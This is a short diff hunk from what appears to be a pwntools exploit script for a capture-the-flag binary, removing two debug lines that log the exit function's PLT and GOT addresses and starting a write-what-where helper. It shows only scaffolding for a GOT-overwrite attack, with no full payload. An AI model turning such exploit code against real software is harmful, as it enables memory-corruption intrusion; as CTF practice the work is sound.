@@ -26,8 +26,7 @@ libc = ELF('./libc.so.6')
 context.log_level = 'debug'
 
 io = start()
-log.info("%#x exit.plt", elf.plt.exit)
-log.info("%#x exit.got", elf.got.exit)
+
 def www(what, where):
 	# read 4 bytes -> p32
   io.sendafter(b'what?\n', what)
